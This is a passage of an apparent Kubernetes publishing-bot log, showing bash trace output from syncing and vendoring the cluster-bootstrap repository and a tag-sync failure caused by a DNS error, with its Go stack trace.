dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/cluster-bootstrap\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cluster-bootstrap/\") or . == \"k8s.io/cluster-bootstrap\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t++ git log --format=%B HEAD\n>\t+ local k_last_kube_commit=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>\t++ git-find-merge c179a9c9df4bfb6421258a5f31da9f595474ada4 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'c179a9c9df4bfb6421258a5f31da9f595474ada4^1..upstream-branch' --first-parent\n>\t+++ git rev-list c179a9c9df4bfb6421258a5f31da9f595474ada4..upstream-branch --ancestry-path\n>\t+++ git rev-parse c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ local k_last_kube_merge=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b c179a9c9df4bfb6421258a5f31da9f595474ada4 ../kube-commits-apimachinery-master\n>\t+ '[' -z c6dd271be00615c6fa8c91fdf63381265a5f0e4e ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>\t+ echo 'Checking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e'\n>\t+ git checkout -q c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b c179a9c9df4bfb6421258a5f31da9f595474ada4 ../kube-commits-api-master\n>\tChecking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>\t+ '[' -z a191abe0b71e00ce4cde58af8002aa4c1a8bb068 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068'\n>\t+ git checkout -q a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\tGodeps.json hasn't changed!\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\tRemove redundant godep commits on-top of 6cc12ac9d30b948591694f72f75a1d8dd00395e7.\n>\t+ echo 'Remove redundant godep commits on-top of 6cc12ac9d30b948591694f72f75a1d8dd00395e7.'\n>\t+ git reset --soft -q 6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/cluster-bootstrap\n>\t+ local repo=cluster-bootstrap\n>\t++ head -n 1\n>\t++ git log --oneline --first-parent --merges\n>\t+ '[' -n '345cb50 Merge pull request #67356 from yliaog/master' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-cluster-bootstrap-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-cluster-bootstrap-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-cluster-bootstrap-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-cluster-bootstrap-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-cluster-bootstrap-master.sh --dependencies apimachinery:master,api:master --mapping-output-file '../tag-cluster-bootstrap-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tfatal: unable to access 'https://github.com/kubernetes/cluster-bootstrap/': Could not resolve host: github.com\n>\tF1009 18:02:15.802316   17996 main.go:149] Failed to fetch tags for \"origin\": exit status 128\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc42d362e00, 0xc427f7a6c0, 0x5e, 0xb2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xc77880, 0xc400000003, 0xc4200bc210, 0xc1877a, 0x7, 0x95, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xc77880, 0x3, 0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:149 +0x2bea\n>[09 Oct 18 18:02 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=cluster-bootstrap\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=apimachinery:master,api:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/cluster-bootstrap\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=4966faab3618ff2889326a3e64ef2bbb7433e610\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ grep -w -q upstream\n>    \t+ git remote\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=686b37ff9be554dc030b60d4624d5a512d5dd735\n>    \t+ '[' 686b37ff9be554dc030b60d4624d5a512d5dd735 '!=' 4966faab3618ff2889326a3e64ef2bbb7433e610 ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''4966faab3618ff2889326a3e64ef2bbb7433e610'\\'' to '\\''686b37ff9be554dc030b60d4624d5a512d5dd735'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/cluster-bootstrap master master apimachinery:master,api:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/cluster-bootstrap\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=apimachinery:master,api:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 9 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit 6cc12ac9d30b948591694f72f75a1d8dd00395e7.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 686b37ff9be554dc030b60d4624d5a512d5dd735.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B master\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ head -n 1\n>    \t+ local k_base_commit=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>    \t++ git-find-merge c179a9c9df4bfb6421258a5f31da9f595474ada4 upstream/master\n>    \t++ tail -1\n>    \t+++ git rev-list 'c179a9c9df4bfb6421258a5f31da9f595474ada4^1..upstream/master' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list c179a9c9df4bfb6421258a5f31da9f595474ada4..upstream/master --ancestry-path\n>    \t+++ git rev-parse c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ local k_base_merge=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>    \t+ git branch -f filtered-branch-base c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/cluster-bootstrap.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/cluster-bootstrap 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/cluster-bootstrap\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/cluster-bootstrap -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=5cf4b97b414afd0a3a203bc0d3798d7ba6b7979e\n>    \t++ git log --first-parent --format=%H --reverse 5cf4b97b414afd0a3a203bc0d3798d7ba6b7979e..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' 6cc12ac9d30b948591694f72f75a1d8dd00395e7 '!=' 6cc12ac9d30b948591694f72f75a1d8dd00395e7 ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps apimachinery:master,api:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:master,api:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:master,api:master k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:master,api:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/cluster-bootstrap\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ indent-godeps\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cluster-bootstrap/\") or . == \"k8s.io/cluster-bootstrap\") | not))' Godeps/Godeps.json\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ head -n 1\n>    \t++ git log --format=%B HEAD\n>    \t+ local k_last_kube_commit=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ '[' -z c179a9c9df4bfb6421258a5f31da9f595474ada4 ']'\n>    \t++ git-find-merge c179a9c9df4bfb6421258a5f31da9f595474ada4 upstream-branch\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 'c179a9c9df4bfb6421258a5f31da9f595474ada4^1..upstream-branch' --first-parent\n>    \t+++ git rev-list c179a9c9df4bfb6421258a5f31da9f595474ada4..upstream-branch --ancestry-path\n>    \t+++ git rev-parse c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ local k_last_kube_merge=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>    \t+ local dep_count=2\n>    \t+ (( i=0 ))\n>    \t+ (( i<2 ))\n>    \t+ local dep=apimachinery\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b c179a9c9df4bfb6421258a5f31da9f595474ada4 ../kube-commits-apimachinery-master\n>    \t+ '[' -z c6dd271be00615c6fa8c91fdf63381265a5f0e4e ']'\n>    \t+ pushd ../apimachinery\n>    \t+ echo 'Checking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e'\n>    \t+ git checkout -q c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<2 ))\n>    \t+ local dep=api\n>    \t+ local branch=master\n>    \t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>    \t+ local k_commit=\n>    \t+ local dep_commit=\n>    \t+ read k_commit dep_commit\n>    \t++ look -b c179a9c9df4bfb6421258a5f31da9f595474ada4 ../kube-commits-api-master\n>    \t+ '[' -z a191abe0b71e00ce4cde58af8002aa4c1a8bb068 ']'\n>    \t+ pushd ../api\n>    \t+ echo 'Checking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068'\n>    \t+ git checkout -q a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>    \t+ popd\n>    \t+ (( i++  ))\n>    \t+ (( i<2 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' true = true ']'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>    \t+ rm -rf ./vendor/github.com/golang/glog\n>    \t+ rm -rf ./vendor/k8s.io\n>    \t+ rm -rf ./vendor/github.com/google/gofuzz\n>    \t+ rm -rf ./vendor/github.com/go-openapi\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code 6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ echo 'Remove redundant godep commits on-top of 6cc12ac9d30b948591694f72f75a1d8dd00395e7.'\n>    \t+ git reset --soft -q 6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/cluster-bootstrap\n>    \t+ local repo=cluster-bootstrap\n>    \t++ head -n 1\n>    \t++ git log --oneline --first-parent --merges\n>    \t+ '[' -n '345cb50 Merge pull request #67356 from yliaog/master' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-cluster-bootstrap-master'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=master\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=6cc12ac9d30b948591694f72f75a1d8dd00395e7\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-cluster-bootstrap-master.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-cluster-bootstrap-master.sh\n>    \t+ '[' -z '' ']'\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags 